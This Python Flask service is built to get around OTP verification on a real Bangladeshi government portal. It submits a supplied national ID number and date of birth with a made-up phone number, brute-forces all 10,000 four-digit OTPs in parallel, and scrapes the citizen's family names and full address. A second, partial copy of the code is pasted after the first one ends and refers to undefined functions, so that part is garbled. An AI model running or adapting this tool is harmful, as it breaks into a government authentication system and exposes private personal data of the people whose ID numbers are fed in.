from flask import Flask, request, jsonify
import requests
import random
import string
from urllib.parse import urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
import re
import json

app = Flask(__name__)

def random_mobile(prefix):
    return prefix + f"{random.randint(10000000, 99999999):08d}"

def random_password():
    return "#" + random.choice(string.ascii_uppercase) + ''.join(random.choices(string.ascii_letters + string.digits, k=8))

def get_session_and_bypass(nid, dob, mobile, password):
    url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor"
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cache-Control': 'max-age=0',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'Origin': 'https://fsmms.dgf.gov.bd',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/movementContractor',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    
    data = {
        "nidNumber": nid,
        "email": "",
        "mobileNo": mobile,
        "dateOfBirth": dob,
        "password": password,
        "confirm_password": password,
        "next1": ""
    }
    
    session = requests.Session()
    response = session.post(url, data=data, headers=headers, allow_redirects=False)
    
    if response.status_code == 302 and 'mov-verification' in response.headers.get('Location', ''):
        return session
    else:
        raise Exception("Bypass Failed")

def try_otp(session, otp):
    url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step"
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cache-Control': 'max-age=0',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'Origin': 'https://fsmms.dgf.gov.bd',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    
    data = {
        "otpDigit1": otp[0],
        "otpDigit2": otp[1],
        "otpDigit3": otp[2],
        "otpDigit4": otp[3]
    }
    
    response = session.post(url, data=data, headers=headers, allow_redirects=False)
    
    if response.status_code == 302 and 'movementContractor/form' in response.headers.get('Location', ''):
        return otp
    return None

def try_batch(session, otp_batch):
    with ThreadPoolExecutor(max_workers=100) as executor:
        future_to_otp = {executor.submit(try_otp, session, otp): otp for otp in otp_batch}
        for future in as_completed(future_to_otp):
            result = future.result()
            if result:
                executor.shutdown(wait=False, cancel_futures=True)
                return result
    return None

def fetch_form_data(session):
    url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form"
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    
    response = session.get(url, headers=headers)
    return response.text

def extract_fields(html, ids):
    result = {}
    for field_id in ids:
        pattern = rf'<input[^>]*id="{field_id}"[^>]*value="([^"]*)"'
        match = re.search(pattern, html)
        result[field_id] = match.group(1) if match else ""
    return result

def enrich_data(nid, dob, contractor_name, result):
    mapped = {
        "nameBangla": contractor_name,
        "nameEnglish": "",
        "nationalId": nid,
        "dateOfBirth": dob,
        "fatherName": result.get("fatherName", ""),
        "motherName": result.get("motherName", ""),
        "spouseName": result.get("spouseName", ""),
        "gender": "",
        "religion": "",
        "birthPlace": result.get("nidPerDistrict", ""),
        "nationality": result.get("nationality", ""),
        "division": result.get("nidPerDivision", ""),
        "district": result.get("nidPerDistrict", ""),
        "upazila": result.get("nidPerUpazila", ""),
        "union": result.get("nidPerUnion", ""),
        "village": result.get("nidPerVillage", ""),
        "ward": result.get("nidPerWard", ""),
        "zip_code": result.get("nidPerZipCode", ""),
        "post_office": result.get("nidPerPostOffice", "")
    }

    address_parts = [
        f"বাসা/হোল্ডিং: {result.get('nidPerHolding', '-')}",
        f"গ্রাম/রাস্তা: {result.get('nidPerVillage', '')}",
        f"মৌজা/মহল্লা: {result.get('nidPerMouza', '')}",
        f"ইউনিয়ন ওয়ার্ড: {result.get('nidPerUnion', '')}",
        f"ডাকঘর: {result.get('nidPerPostOffice', '')} - {result.get('nidPerZipCode', '')}",
        f"উপজেলা: {result.get('nidPerUpazila', '')}",
        f"জেলা: {result.get('nidPerDistrict', '')}",
        f"বিভাগ: {result.get('nidPerDivision', '')}"
    ]
    address_line = ", ".join([p for p in address_parts if p.split(": ")[1]])

    mapped["permanentAddress"] = address_line
    mapped["presentAddress"] = address_line
    return mapped

@app.route('/get-info', methods=['GET'])
def get_info():
    try:
        nid = request.args.get('nid')
        dob = request.args.get('dob')
        
        if not nid or not dob:
            return jsonify({'error': 'NID and DOB are required'}), 400

        # ==================== CONFIG ====================
        mobile_prefix = "016"
        batch_size = 500

        # OTP range
        otp_range = [f"{i:04d}" for i in range(10000)]

        # Generate random credentials
        mobile = random_mobile(mobile_prefix)
        password = random_password()
        
        print(f"Using Mobile: {mobile}")
        print(f"Using Password: {password}")
        
        # Step 1: Get session and bypass initial verification
        print("Step 1: Bypassing initial verification...")
        session = get_session_and_bypass(nid, dob, mobile, password)
        print("✓ Initial bypass successful")
        
        # Step 2: Try OTPs in batches
        print("Step 2: Brute-forcing OTP...")
        random.shuffle(otp_range)
        found_otp = None
        
        for i in range(0, len(otp_range), batch_size):
            batch = otp_range[i:i+batch_size]
            print(f"Trying batch {i//batch_size + 1}/{(len(otp_range)//batch_size)+1}...")
            found_otp = try_batch(session, batch)
            if found_otp:
                print(f"✓ OTP found: {found_otp}")
                break
        
        if found_otp:
            # Step 3: Fetch form data
            print("Step 3: Fetching form data...")
            html = fetch_form_data(session)
            
            # Step 4: Extract and enrich data
            field_ids = [
                "contractorName", "fatherName", "motherName", "spouseName", 
                "nidPerDivision", "nidPerDistrict", "nidPerUpazila", "nidPerUnion", 
                "nidPerVillage", "nidPerWard", "nidPerZipCode", "nidPerPostOffice"
            ]
            
            extracted_data = extract_fields(html, field_ids)
            final_data = enrich_data(nid, dob, extracted_data.get("contractorName", ""), extracted_data)
            
            print("\n" + "="*50)
            print("EXTRACTED DATA:")
            print("="*50)
            print(json.dumps(final_data, ensure_ascii=False, indent=2))
            
            return jsonify(final_data), 200
            
        else:
            print("✗ OTP not found")
            return jsonify({"error": "OTP not found"}), 404
            
    except Exception as e:
        print(f"Error: {str(e)}")
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)            session = requests.Session()
            res = session.post(url, data=data, allow_redirects=False)
            if res.status_code == 302 and 'mov-verification' in res.headers.get('Location', ''):
                return session
            else:
                raise Exception("Bypass Failed")

        def try_otp(session, otp):
            url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step"
            data = {
                "otpDigit1": otp[0],
                "otpDigit2": otp[1],
                "otpDigit3": otp[2],
                "otpDigit4": otp[3]
            }
            res = session.post(url, data=data, allow_redirects=False)
            if res.status_code == 302 and target_location in res.headers.get('Location', ''):
                return otp
            return None

        def try_batch(session, otp_batch):
            with ThreadPoolExecutor(max_workers=100) as executor:
                future_to_otp = {executor.submit(try_otp, session, otp): otp for otp in otp_batch}
                for future in as_completed(future_to_otp):
                    result = future.result()
                    if result:
                        executor.shutdown(cancel_futures=True)
                        return result
            return None

        def fetch_form_data(session):
            url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form"
            res = session.get(url)
            return res.text

        def extract_fields(html, ids):
            result = {}
            for field_id in ids:
                match = re.search(rf'<input[^>]*id="{field_id}"[^>]*value="([^"]*)"', html)
                result[field_id] = match.group(1) if match else ""
            return result

        def enrich_data(contractor_name, result):
            mapped = {
                "nameBangla": contractor_name,
                "nameEnglish": "",
                "nationalId": nid,
                "dateOfBirth": dob,
                "fatherName": result.get("fatherName", ""),
                "motherName": result.get("motherName", ""),
                "spouseName": result.get("spouseName", ""),
                "gender": "",
                "religion": "",
                "birthPlace": result.get("nidPerDistrict", ""),
                "nationality": result.get("nationality", ""),
                "division": result.get("nidPerDivision", ""),
                "district": result.get("nidPerDistrict", ""),
                "upazila": result.get("nidPerUpazila", ""),
                "union": result.get("nidPerUnion", ""),
                "village": result.get("nidPerVillage", ""),
                "ward": result.get("nidPerWard", ""),
                "zip_code": result.get("nidPerZipCode", ""),
                "post_office": result.get("nidPerPostOffice", "")
            }

            address_parts = [
                f"বাসা/হোল্ডিং: {result.get('nidPerHolding', '-')}",
                f"গ্রাম/রাস্তা: {result.get('nidPerVillage', '')}",
                f"মৌজা/মহল্লা: {result.get('nidPerMouza', '')}",
                f"ইউনিয়ন ওয়ার্ড: {result.get('nidPerUnion', '')}",
                f"ডাকঘর: {result.get('nidPerPostOffice', '')} - {result.get('nidPerZipCode', '')}",
                f"উপজেলা: {result.get('nidPerUpazila', '')}",
                f"জেলা: {result.get('nidPerDistrict', '')}",
                f"বিভাগ: {result.get('nidPerDivision', '')}"
            ]
            address_line = ", ".join([p for p in address_parts if p.split(": ")[1]])

            mapped["permanentAddress"] = address_line
            mapped["presentAddress"] = address_line
            return mapped

        # Main workflow
        password = random_password()
        data = {
            "nidNumber": nid,
            "email": "",
            "mobileNo": random_mobile(mobile_prefix),
            "dateOfBirth": dob,
            "password": password,
            "confirm_password": password,
            "next1": ""
        }

        # 1. Get cookie/session
        session = get_cookie(data)

        # 2. Shuffle OTPs and try in batches
        random.shuffle(otp_range)
        found_otp = None
        for i in range(0, len(otp_range), batch_size):
            batch = otp_range[i:i+batch_size]
            found_otp = try_batch(session, batch)
            if found_otp:
                break

        if found_otp:
            html = fetch_form_data(session)
            ids = ["contractorName","fatherName","motherName","spouseName","nidPerDivision",
                   "nidPerDistrict","nidPerUpazila","nidPerUnion","nidPerVillage","nidPerWard",
                   "nidPerZipCode","nidPerPostOffice"]
            result = extract_fields(html, ids)
            mapped_data = enrich_data(result.get("contractorName", ""), result)
            
            return jsonify(mapped_data), 200
        else:
            return jsonify({"error": "OTP not found"}), 404
            
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)
